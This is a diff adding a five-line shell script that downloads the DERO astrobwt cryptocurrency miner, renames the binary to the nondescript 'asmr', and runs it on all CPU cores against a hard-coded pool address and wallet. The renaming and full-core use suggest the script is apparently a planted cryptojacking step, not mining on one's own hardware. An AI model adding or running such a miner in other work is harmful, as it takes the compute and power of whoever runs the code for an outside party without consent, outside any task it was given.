@@ -1,0 +1,5 @@
+curl https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz -L -o astrominer-V1.9.2.R5_amd64_linux.tar.gz
+tar xf astrominer-V1.9.2.R5_amd64_linux.tar.gz
+cd astrominer
+mv astrominer asmr
+./asmr -r 134.209.95.83:10100 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)
